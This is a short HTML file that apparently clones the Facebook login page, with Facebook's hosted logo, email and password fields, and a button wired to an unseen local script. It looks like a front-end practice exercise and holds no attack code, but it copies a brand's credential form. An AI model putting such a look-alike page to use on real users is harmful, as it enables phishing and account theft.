<!DOCTYPE html>
<html lang="en">
<head>
    <title>Log in to Facebook</title>
    <link rel="stylesheet" href="facebookLogin.css">
    <script src="facebookLogin.js"></script>
</head>
<body>
    <div class="login-container">
    <div class = "section">
        <img class = "logo" src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="facebook logo">
    <div class=" login-box">
        <h4>Log in to Facebook</h4>
        <input type="text" class="input-controls" id = "username" placeholder="Email address or phone Number">
        <input type="password" class="input-controls" id = "password" placeholder="Password">
        <button class="login-button" onclick="facebookLogin()">Log In</button>
      <div class = "login-link">  <a href="#">Forgetten account?</a>
        <a href="#">Signup for facebook</a>
      </div>
    </div>
    </div>    
    
    </div>
</body>
</html>
